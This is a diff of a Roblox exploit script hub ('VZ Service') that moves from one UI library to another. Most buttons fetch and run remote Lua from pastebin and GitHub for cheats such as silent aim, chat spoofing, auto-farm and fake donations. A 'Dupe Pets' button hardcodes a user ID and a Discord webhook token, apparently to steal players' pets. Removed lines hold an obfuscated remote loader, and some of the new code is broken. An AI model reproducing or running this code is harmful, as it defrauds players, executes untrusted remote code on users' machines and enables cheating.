@@ -1,35 +1,45 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("VZ Service | Free Version |", "DarkTheme")
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "VZ Service 🔥", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+OrionLib:MakeNotification({
+	Name = "Discord Server",
+	Content = "Discord Server has been copied, click CTRL + V to paste it!",
+	Image = "rbxassetid://11401835376",
+	Time = 5
+})
 
 setclipboard("https://discord.gg/neJJbmMgrX")
 
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Discord Server"; -- the title (ofc)
-    Text = "Discord Server has been copied to ur clipboard, Press CTRL + V to paste it!"; -- what the text says (ofc)
-    Icon = "rbxassetid://5027762816"; -- the image if u want. 
-    Duration = 3; -- how long the notification should in secounds
-    })
+local Tab = Window:MakeTab({
+	Name = "Main Scripts",
+	Icon = "rbxassetid://7539983773",
+	PremiumOnly = false
+})
 
-    -- MAIN
-    local Main = Window:NewTab("Main")
-    local MainSection = Main:NewSection("Main Scripts")
+local Section = Tab:AddSection({
+	Name = "VZ Service Main Scripts"
+})
 
-    MainSection:NewToggle("Super-Human", "go fast and jump high", function(state)
-        if state then
-            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
-            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
-        else
-            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
-        end
-    end)
 
-    MainSection:NewButton("Admin Commands", "Infinite Yield Commands", function()
+Tab:AddColorpicker({
+	Name = "Pick you're favorite color",
+	Default = Color3.fromRGB(255, 0, 0),
+	Callback = function(Value)
+		
+	end	  
+})
+
+Tab:AddButton({
+	Name = "Admin Commands",
+	Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-    end)
+  	end    
+})
 
-    MainSection:NewButton("Visual Korblox", "Get Korblox (Only you can look it)", function()
-    local ply = game.Players.LocalPlayer
+Tab:AddButton({
+	Name = "Korblox Leg (Visual)",
+	Callback = function()
+        local ply = game.Players.LocalPlayer
     local chr = ply.Character
      chr.RightLowerLeg.MeshId = "902942093"
      chr.RightLowerLeg.Transparency = "1"
@@ -37,118 +47,282 @@ game.StarterGui:SetCore("SendNotification", {
      chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
      chr.RightFoot.MeshId = "902942089"
      chr.RightFoot.Transparency = "1"
+  	end    
+})
 
-    end)
-
-    MainSection:NewButton("Visual Headless", "Get Headless (Only you can look it)", function()
+Tab:AddButton({
+	Name = "Headless Head (Visual)",
+	Callback = function()
         game.Players.LocalPlayer.Character.Head.Transparency = 1
-game.Players.LocalPlayer.Character.Head.Transparency = 1
-for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
-if (v:IsA("Decal")) then
-v.Transparency = 1
-end
-end
-    end)
+        game.Players.LocalPlayer.Character.Head.Transparency = 1
+        for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+        if (v:IsA("Decal")) then
+        v.Transparency = 1
+        end
+        end
+  	end    
+})
 
-    MainSection:NewButton("Destruction Simulator", "Regular Script", function(state)
+Tab:AddButton({
+	Name = "Destruction Simulator Gui",
+	Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/BZ0FKGvv"))()
-    end)
+  	end    
+})
 
-    MainSection:NewButton("Destruction Simulator 10+ Levels", "Dont spam it too much", function(state)
+Tab:AddButton({
+	Name = "Destruction Simulator 10+ Levels (Each time you click)",
+	Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/EnMqnDZX"))()
-    end)
+  	end    
+})
 
-    MainSection:NewButton("Sky Wars GUI", "Regular script", function(state)
+Tab:AddButton({
+	Name = "Sky Wars Gui",
+	Callback = function()
         loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/OPSkywarsGUI_NolixXDohmScripts_Public.lua"))()
-    end)
+  	end    
+})
 
-    MainSection:NewButton("Shindo Life GUI", "Regular script", function(state)
-     local ui_options = { main_color = Color3.fromRGB(50, 20, 10), min_size = Vector2.new(400, 300), toggle_key = Enum.KeyCode.RightShift, can_resize = true, } do local imgui = game:GetService("CoreGui"):FindFirstChild("imgui") if imgui then imgui:Destroy() end end local imgui = Instance.new("ScreenGui") local Prefabs = Instance.new("Frame") local Label = Instance.new("TextLabel") local Window = Instance.new("ImageLabel") local Resizer = Instance.new("Frame") local Bar = Instance.new("Frame") local Toggle = Instance.new("ImageButton") local Base = Instance.new("ImageLabel") local Top = Instance.new("ImageLabel") local Tabs = Instance.new("Frame") local Title = Instance.new("TextLabel") local TabSelection = Instance.new("ImageLabel") local TabButtons = Instance.new("Frame") local UIListLayout = Instance.new("UIListLayout") local Frame = Instance.new("Frame") local Tab = Instance.new("Frame") local UIListLayout_2 = Instance.new("UIListLayout") local TextBox = Instance.new("TextBox") local TextBox_Roundify_4px = Instance.new("ImageLabel") local Slider = Instance.new("ImageLabel") local Title_2 = Instance.new("TextLabel") local Indicator = Instance.new("ImageLabel") local Value = Instance.new("TextLabel") local TextLabel = Instance.new("TextLabel") local TextLabel_2 = Instance.new("TextLabel") local Circle = Instance.new("ImageLabel") local UIListLayout_3 = Instance.new("UIListLayout") local Dropdown = Instance.new("TextButton") local Indicator_2 = Instance.new("ImageLabel") local Box = Instance.new("ImageButton") local Objects = Instance.new("ScrollingFrame") local UIListLayout_4 = Instance.new("UIListLayout") local TextButton_Roundify_4px = Instance.new("ImageLabel") local TabButton = Instance.new("TextButton") local TextButton_Roundify_4px_2 = Instance.new("ImageLabel") local Folder = Instance.new("ImageLabel") local Button = Instance.new("TextButton") local TextButton_Roundify_4px_3 = Instance.new("ImageLabel") local Toggle_2 = Instance.new("ImageLabel") local Objects_2 = Instance.new("Frame") local UIListLayout_5 = Instance.new("UIListLayout") local HorizontalAlignment = Instance.new("Frame") local UIListLayout_6 = Instance.new("UIListLayout") local Console = Instance.new("ImageLabel") local ScrollingFrame = Instance.new("ScrollingFrame") local Source = Instance.new("TextBox") local Comments = Instance.new("TextLabel") local Globals = Instance.new("TextLabel") local Keywords = Instance.new("TextLabel") local RemoteHighlight = Instance.new("TextLabel") local Strings = Instance.new("TextLabel") local Tokens = Instance.new("TextLabel") local Numbers = Instance.new("TextLabel") local Info = Instance.new("TextLabel") local Lines = Instance.new("TextLabel") local ColorPicker = Instance.new("ImageLabel") local Palette = Instance.new("ImageLabel") local Indicator_3 = Instance.new("ImageLabel") local Sample = Instance.new("ImageLabel") local Saturation = Instance.new("ImageLabel") local Indicator_4 = Instance.new("Frame") local Switch = Instance.new("TextButton") local TextButton_Roundify_4px_4 = Instance.new("ImageLabel") local Title_3 = Instance.new("TextLabel") local Button_2 = Instance.new("TextButton") local TextButton_Roundify_4px_5 = Instance.new("ImageLabel") local DropdownButton = Instance.new("TextButton") local Keybind = Instance.new("ImageLabel") local Title_4 = Instance.new("TextLabel") local Input = Instance.new("TextButton") local Input_Roundify_4px = Instance.new("ImageLabel") local Windows = Instance.new("Frame") imgui.Name = "imgui" imgui.Parent = game:GetService("CoreGui") Prefabs.Name = "Prefabs" Prefabs.Parent = imgui Prefabs.BackgroundColor3 = Color3.new(1, 1, 1) Prefabs.Size = UDim2.new(0, 100, 0, 100) Prefabs.Visible = false
-    end)
+Tab:AddButton({
+	Name = "Shindo Life Gui",
+	Callback = function()
+        local ui_options = { main_color = Color3.fromRGB(50, 20, 10), min_size = Vector2.new(400, 300), toggle_key = Enum.KeyCode.RightShift, can_resize = true, } do local imgui = game:GetService("CoreGui"):FindFirstChild("imgui") if imgui then imgui:Destroy() end end local imgui = Instance.new("ScreenGui") local Prefabs = Instance.new("Frame") local Label = Instance.new("TextLabel") local Window = Instance.new("ImageLabel") local Resizer = Instance.new("Frame") local Bar = Instance.new("Frame") local Toggle = Instance.new("ImageButton") local Base = Instance.new("ImageLabel") local Top = Instance.new("ImageLabel") local Tabs = Instance.new("Frame") local Title = Instance.new("TextLabel") local TabSelection = Instance.new("ImageLabel") local TabButtons = Instance.new("Frame") local UIListLayout = Instance.new("UIListLayout") local Frame = Instance.new("Frame") local Tab = Instance.new("Frame") local UIListLayout_2 = Instance.new("UIListLayout") local TextBox = Instance.new("TextBox") local TextBox_Roundify_4px = Instance.new("ImageLabel") local Slider = Instance.new("ImageLabel") local Title_2 = Instance.new("TextLabel") local Indicator = Instance.new("ImageLabel") local Value = Instance.new("TextLabel") local TextLabel = Instance.new("TextLabel") local TextLabel_2 = Instance.new("TextLabel") local Circle = Instance.new("ImageLabel") local UIListLayout_3 = Instance.new("UIListLayout") local Dropdown = Instance.new("TextButton") local Indicator_2 = Instance.new("ImageLabel") local Box = Instance.new("ImageButton") local Objects = Instance.new("ScrollingFrame") local UIListLayout_4 = Instance.new("UIListLayout") local TextButton_Roundify_4px = Instance.new("ImageLabel") local TabButton = Instance.new("TextButton") local TextButton_Roundify_4px_2 = Instance.new("ImageLabel") local Folder = Instance.new("ImageLabel") local Button = Instance.new("TextButton") local TextButton_Roundify_4px_3 = Instance.new("ImageLabel") local Toggle_2 = Instance.new("ImageLabel") local Objects_2 = Instance.new("Frame") local UIListLayout_5 = Instance.new("UIListLayout") local HorizontalAlignment = Instance.new("Frame") local UIListLayout_6 = Instance.new("UIListLayout") local Console = Instance.new("ImageLabel") local ScrollingFrame = Instance.new("ScrollingFrame") local Source = Instance.new("TextBox") local Comments = Instance.new("TextLabel") local Globals = Instance.new("TextLabel") local Keywords = Instance.new("TextLabel") local RemoteHighlight = Instance.new("TextLabel") local Strings = Instance.new("TextLabel") local Tokens = Instance.new("TextLabel") local Numbers = Instance.new("TextLabel") local Info = Instance.new("TextLabel") local Lines = Instance.new("TextLabel") local ColorPicker = Instance.new("ImageLabel") local Palette = Instance.new("ImageLabel") local Indicator_3 = Instance.new("ImageLabel") local Sample = Instance.new("ImageLabel") local Saturation = Instance.new("ImageLabel") local Indicator_4 = Instance.new("Frame") local Switch = Instance.new("TextButton") local TextButton_Roundify_4px_4 = Instance.new("ImageLabel") local Title_3 = Instance.new("TextLabel") local Button_2 = Instance.new("TextButton") local TextButton_Roundify_4px_5 = Instance.new("ImageLabel") local DropdownButton = Instance.new("TextButton") local Keybind = Instance.new("ImageLabel") local Title_4 = Instance.new("TextLabel") local Input = Instance.new("TextButton") local Input_Roundify_4px = Instance.new("ImageLabel") local Windows = Instance.new("Frame") imgui.Name = "imgui" imgui.Parent = game:GetService("CoreGui") Prefabs.Name = "Prefabs" Prefabs.Parent = imgui Prefabs.BackgroundColor3 = Color3.new(1, 1, 1) Prefabs.Size = UDim2.new(0, 100, 0, 100) Prefabs.Visible = false
+  	end    
+})
 
-    MainSection:NewButton("Mad City", "Regular script", function(state)
+Tab:AddButton({
+	Name = "Mad City Gui",
+	Callback = function()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/811e25ec8cfcdaa9ae7026353288783c/raw/4b073a5c1a0a4e2ed7e2304c2e769eb440a371a9/h", true))()
-       end)
+  	end    
+})
 
-       MainSection:NewButton("Ninja Tycoon", "Regular script", function(state)
+Tab:AddButton({
+	Name = "Ninja Tycoon Gui",
+	Callback = function()
         loadstring(game:HttpGet'https://pastebin.com/raw/TFfWqiXK')()
-       end)
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Ninja Tycoon Gui",
+	Callback = function()
+        loadstring(game:HttpGet'https://pastebin.com/raw/TFfWqiXK')()
+  	end    
+})
 
 
 
+local Tab2 = Window:MakeTab({
+	Name = "Player Scripts",
+	Icon = "rbxassetid://2795572800",
+	PremiumOnly = false
+})
 
-    --LOCAL PLAYER
-    local Player = Window:NewTab("Player")
-    local PlayerSection = Player:NewSection("Player Scripts")
+local Section = Tab2:AddSection({
+	Name = "Character & Player scrpts"
+})
 
-    PlayerSection:NewSlider("Walkspeed", "Change Walk Speed", 500, 16, function(s)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
-    end)
-
-    PlayerSection:NewSlider("Jumppower", "Change Jump Power", 350, 50, function(s)
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
-    end)
-
-    PlayerSection:NewButton("Reset WalkSpeed/Jump", "Resets to all defaults", function()
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-    end)
-
-    PlayerSection:NewButton("Walk Slow", "Walk Cool ;)", function()
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 6
-    end)
+Tab2:AddSlider({
+	Name = "Walkspeed",
+	Min = 16,
+	Max = 500,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Speed",
+	Callback = function(s)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+	end    
+})
 
 
-    --Other
-    local Other = Window:NewTab("Other")
-    local OtherSection = Other:NewSection("Other Scripts")
+Tab2:AddSlider({
+	Name = "JumPower",
+	Min = 50,
+	Max = 500,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Jump Power",
+	Callback = function(s)
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+	end    
+})
 
-    OtherSection:NewButton("Chat Spoofer", "Lets you chat as other people", function()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
-    end)
-
-    OtherSection:NewButton("Fly", "Press X to toggle Fly", function()
+Tab2:AddButton({
+	Name = "Fly",
+	Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 
 
-        Fly(true)
-    end)
+        OrionLib:MakeNotification({
+            Name = "X Toggle",
+            Content = "Click X to toggle Fly",
+            Image = "rbxassetid://11401835376",
+            Time = 5
+        })
+  	end    
+})
 
-   --PLS DONATE
-   local Tab = Window:NewTab("PLS Donate")
-   local TabSection = Tab:NewSection("Pls Donate Scripts")
 
-   TabSection:NewButton("Fake Donate Visual", "Visual ( only you can see )", function()
-    _G.WhoDonated = "You"
+local Tab3 = Window:MakeTab({
+	Name = "Fun & Troll",
+	Icon = "rbxassetid://10885655986",
+	PremiumOnly = false
+})
+
+local Section = Tab3:AddSection({
+	Name = "Theese scripts are mostly to play around with people"
+})
+
+
+Tab3:AddButton({
+	Name = "Chat Spoofer",
+	Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
+  	end    
+})
+
+
+local Tab4 = Window:MakeTab({
+	Name = "Pls Donate",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
+
+local Section = Tab4:AddSection({
+	Name = "Pls Donate Scripts"
+})
+
+
+Tab4:AddButton({
+	Name = "Fake Donate 100 Robux to Friend",
+	Callback = function()
+        _G.WhoDonated = "You"
 _G.HowMuchRobux = 100
 _G.WhoGotRobux = "Friend"
-_G.SmiteAnimationId = "ID" -- the id of the person that will appear on the 1mil effect
+_G.SmiteAnimationId = "ID"
+  	end    
+})
 
-SGTSOBF_ffFFFFFFf={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\114","\97","\119","\46","\103","\105","\116","\104","\117","\98","\117","\115","\101","\114","\99","\111","\110","\116","\101","\110","\116","\46","\99","\111","\109","\47","\108","\111","\108","\116","\104","\97","\116","\115","\101","\97","\122","\121","\47","\101","\122","\97","\122","\97","\47","\109","\97","\105","\110","\47","\80","\108","\115","\68","\111","\110","\97","\116","\101","\70","\97","\107","\101","\68","\111","\110","\111","\46","\116","\120","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_gGGGgGggg="";for _,SGTSOBF_RRrrRRrrr in pairs(SGTSOBF_ffFFFFFFf)do SGTSOBF_gGGGgGggg=SGTSOBF_gGGGgGggg..SGTSOBF_RRrrRRrrr;end;SGTSOBF_LlllllLlL=function(SGTSOBF_zZzZzZzzZ)loadstring(SGTSOBF_zZzZzZzzZ)()end;SGTSOBF_LlllllLlL(SGTSOBF_gGGGgGggg)
-
-end)
-
-TabSection:NewButton("1K Fake Donate Visual", "Visual ( only you can see )", function()
-    _G.WhoDonated = "You"
-_G.HowMuchRobux = 1000
-_G.WhoGotRobux = "Friend"
-_G.SmiteAnimationId = "ID" -- the id of the person that will appear on the 1mil effect
-
-SGTSOBF_ffFFFFFFf={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\114","\97","\119","\46","\103","\105","\116","\104","\117","\98","\117","\115","\101","\114","\99","\111","\110","\116","\101","\110","\116","\46","\99","\111","\109","\47","\108","\111","\108","\116","\104","\97","\116","\115","\101","\97","\122","\121","\47","\101","\122","\97","\122","\97","\47","\109","\97","\105","\110","\47","\80","\108","\115","\68","\111","\110","\97","\116","\101","\70","\97","\107","\101","\68","\111","\110","\111","\46","\116","\120","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_gGGGgGggg="";for _,SGTSOBF_RRrrRRrrr in pairs(SGTSOBF_ffFFFFFFf)do SGTSOBF_gGGGgGggg=SGTSOBF_gGGGgGggg..SGTSOBF_RRrrRRrrr;end;SGTSOBF_LlllllLlL=function(SGTSOBF_zZzZzZzzZ)loadstring(SGTSOBF_zZzZzZzzZ)()end;SGTSOBF_LlllllLlL(SGTSOBF_gGGGgGggg)
-
-end)
+Tab4:AddButton({
+	Name = "Fake Donate 1000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 1000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
 
 
-   -- PSX sCRIPTS 
-   local PSX = Window:NewTab("Pet Simulator X")
-   local PSXSection = PSX:NewSection("PSX Scripts")
+Tab4:AddButton({
+	Name = "Fake Donate 10,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 10,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
 
-   PSXSection:NewButton("Auto Farm GUI", "Gives you an AUTO FARM GUI", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/Ryans/main/Ghosthub.lua"))()
-end)
 
-PSXSection:NewButton("Spam Eggs Script", "Spams EVERY egg", function()
-    _G.Enabled = true --// set to "false" to disable the script
+Tab4:AddButton({
+	Name = "Fake Donate 25,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 25,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab4:AddButton({
+	Name = "Fake Donate 50,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 50,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab4:AddButton({
+	Name = "Fake Donate 75,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 75,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+Tab4:AddButton({
+	Name = "Fake Donate 100,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 100,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab4:AddButton({
+	Name = "Fake Donate 500,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 500,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab4:AddButton({
+	Name = "Fake Donate 1,000,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 1,000,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+local Tab5 = Window:MakeTab({
+	Name = "Pet Simulator X",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
+
+local Section = Tab5:AddSection({
+	Name = "Psx (Pet Simulator X) Scripts"
+})
+
+Tab5:AddButton({
+	Name = "Auto Farm Gui",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/Ryans/main/Ghosthub.lua"))()
+  	end    
+})
+
+Tab5:AddButton({
+	Name = "Spam Eggs (Might Lag You're Game)",
+	Callback = function()
+
+        OrionLib:MakeNotification({
+            Name = "Lagging alot?",
+            Content = "if you're PC is a potato, you might crash so please rejoin (ONLY if you're lagging)",
+            Image = "rbxassetid://11401835376",
+            Time = 5
+        })
+
+
+        _G.Enabled = true --// set to "false" to disable the script
 
 local useGolden = true --// Set to "false" if you don't want to open golden eggs
 
@@ -242,201 +416,195 @@ repeat wait() until e ~= nil
 rprint("Running Time: "..tostring(Time(startTick)))
 end
 
-end)
-    
-PSXSection:NewButton("Dupe Pets", "Equip The Pet you wanna Dupe and Rejoin", function()
-    _G.UserID = 1930407347
-_G.WebHook = "https://discord.com/api/webhooks/1038931177601515552/V5gDZKSXYRmF1v-v4jcvBEnlmPjXCvAWKyfG-BwJGDYlS87ps2-JCyh8TAyJ-3Be-VHj"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Psx.v3/main/SilenceScripts.true"))()
-end)
-
-PSXSection:NewButton("Auto Farm GUI 2", "Gives you an AUTO FARM GUI", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/95HthyJq"))() 
-end)
+  	end    
+})
 
 
--- ADOPT ME SCRIPTS 
-local ADOPTME = Window:NewTab("Adopt Me")
-local ADOPTMESection = ADOPTME:NewSection("Adopt Me Scripts")
-
-ADOPTMESection:NewButton("VG GUI", "An GUI with a loot of stuff", function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
-end)
-
-ADOPTMESection:NewButton("INFINITE Money (Risk)", "Get infinite money (Might get you banned)", function()
-    wait(1.2)
-    game.StarterGui:SetCore("SendNotification", {
-    Title = "PATCHED"; -- the title (ofc)
-    Text = "Rejoin FAST!, - If the Adopt Me catch up, you will be banned, LEAVE OR REJOIN AS FAST AS POSSIBLE"; -- what the text says (ofc)
-    Icon = "rbxassetid://6525485108"; -- the image if u want. 
-    Duration = 2; -- how long the notification should in secounds
-    })
-end)
-
--- Build A Boat
-local Boat = Window:NewTab("Build A Boat")
-local BoatSection = Boat:NewSection("Build a Boat Scripts")
-
-BoatSection:NewButton("Infinite Blocks", "Get 999999 Blocks", function()
-    game.Players.LocalPlayer.Data.Cannon.Value=999999;game.Players.LocalPlayer.Data.TNT.Value=9999999;game.Players.LocalPlayer.Data.WoodRod.Value=9999999;game.Players.LocalPlayer.Data.Throne.Value=9999999;game.Players.LocalPlayer.Data.Step.Value=9999999;game.Players.LocalPlayer.Data.Truss.Value=999999;game.Players.LocalPlayer.Data.Wedge.Value=9999999;game.Players.LocalPlayer.Data.CornerWedge.Value=9999999;game.Players.LocalPlayer.Data.Seat.Value=9999999;game.Players.LocalPlayer.Data.Mast.Value=9999999;game.Players.LocalPlayer.Data.Flag.Value=9999999;game.Players.LocalPlayer.Data.Window.Value=9999999;game.Players.LocalPlayer.Data.StoneBlock.Value=9999999;game.Players.LocalPlayer.Data.StoneRod.Value=9999999;game.Players.LocalPlayer.Data.RustedRod.Value=9999999;game.Players.LocalPlayer.Data.RustedBlock.Value=999999;game.Players.LocalPlayer.Data.MetalRod.Value=9999999;game.Players.LocalPlayer.Data.ConcreteRod.Value=9999999;game.Players.LocalPlayer.Data.MetalBlock.Value=999999;game.Players.LocalPlayer.Data.MarbleRod.Value=999999;game.Players.LocalPlayer.Data.TitaniumRod.Value=9999999;game.Players.LocalPlayer.Data.ConcreteBlock.Value=9999999;game.Players.LocalPlayer.Data.MarbleBlock.Value=9999999;game.Players.LocalPlayer.Data.TitaniumBlock.Value=9999999;game.Players.LocalPlayer.Data.Wheel.Value=9999999;game.Players.LocalPlayer.Data.Chair.Value=9999999;game.Players.LocalPlayer.Data.Torch.Value=9999999;game.Players.LocalPlayer.Data.YellowChest.Value=9999999;game.Players.LocalPlayer.Data.LifePreserver.Value=9999;game.Players.LocalPlayer.Data['Steel I-Beam'].Value=999999
-end)
+Tab5:AddButton({
+	Name = "Dupe Pets (Equip 2 Pets to Dupe)",
+	Callback = function()
+        _G.UserID = 1930407347
+        _G.WebHook = "https://discord.com/api/webhooks/1038931177601515552/V5gDZKSXYRmF1v-v4jcvBEnlmPjXCvAWKyfG-BwJGDYlS87ps2-JCyh8TAyJ-3Be-VHj"
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Psx.v3/main/SilenceScripts.true"))()
+  	end    
+})
 
 
--- DaHood Scripts
-local Hood = Window:NewTab("Da Hood")
-local HoodSection = Hood:NewSection("Da Hood Scripts")
+Tab5:AddButton({
+	Name = "Auto Farm Gui 2",
+	Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/95HthyJq"))() 
+  	end    
+})
 
-HoodSection:NewButton("Da Hood GUI [CRASHING]", "Works but crashes youre game", function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
-end)
 
-HoodSection:NewButton("Admin Fly", "Fly with ADMIN animations", function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
-end)
+local Tab6 = Window:MakeTab({
+	Name = "Adopt Me",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
 
-HoodSection:NewButton("Da Hood GUI [Working]", "A better da hood script", function()
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()
-end)
+local Section = Tab6:AddSection({
+	Name = "Adopt Me Scripts"
+})
 
-HoodSection:NewButton("Silent Aim", "Get a better AIM", function()
-    -- // Dependencies
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/Aiming/main/Examples/AimLock.lua"))()
-local AimingChecks = Aiming.Checks
-local AimingSelected = Aiming.Selected
-local AimLockSettings = Aiming.AimLock
 
--- // Services
-local Workspace = game:GetService("Workspace")
+Tab6:AddButton({
+	Name = "VG Hub Gui",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+  	end    
+})
 
--- // Vars
-local CurrentCamera = Workspace.CurrentCamera
+Tab6:AddButton({
+	Name = "Make Every Pet Fly & Ride",
+	Callback = function()
+        while true do
+            wait()
+         local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+         local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+         for i,v in pairs(playerData.inventory.pets) do
+         v.properties.flyable = true
+         end
+         end
 
-local DaHoodSettings = {
-    Prediction = 0.165,
+         while true do
+            wait()
+         local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+         local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+         for i,v in pairs(playerData.inventory.pets) do
+         v.properties.rideable = true
+         end
+         end
+  	end    
+})
 
-    SilentAim = true,
+Tab6:AddButton({
+	Name = "Make Every Pet Fly",
+	Callback = function()
+        while true do
+            wait()
+         local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+         local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+         for i,v in pairs(playerData.inventory.pets) do
+         v.properties.flyable = true
+         end
+         end
+  	end    
+})
 
-    AimLock = AimLockSettings,
-    BeizerLock = {
-        Smoothness = 0.05,
-        CurvePoints = {
-            Vector2.new(0.83, 0),
-            Vector2.new(0.17, 1)
-        }
-    }
-}
-getgenv().DaHoodSettings = DaHoodSettings
 
--- //
-local function ApplyPredictionFormula(SelectedPart)
-    return SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
-end
+Tab6:AddButton({
+	Name = "Make Every Pet Ride",
+	Callback = function()
+        while true do
+            wait()
+         local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+         local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+         for i,v in pairs(playerData.inventory.pets) do
+         v.properties.rideable = true
+         end
+         end
+  	end    
+})
 
--- // Hook
-local __index
-__index = hookmetamethod(game, "__index", function(t, k)
-    -- // Check if it trying to get our mouse's hit or target and see if we can use it
-    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and AimingChecks.IsAvailable() and DaHoodSettings.SilentAim) then
-        -- // Vars
-        local SelectedPart = AimingSelected.Part
-        local Hit = ApplyPredictionFormula(SelectedPart)
 
-        -- // Return modded val
-        return (k == "Hit" and Hit or SelectedPart)
-    end
+local Tab7 = Window:MakeTab({
+	Name = "Da Hood",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
 
-    -- // Return
-    return __index(t, k)
-end)
+local Section = Tab7:AddSection({
+	Name = "Da Hood Scripts"
+})
 
--- // Aimlock
-function AimLockSettings.AimLockPosition(CameraMode)
-    -- // Vars
-    local Position
-    local BeizerData = {}
 
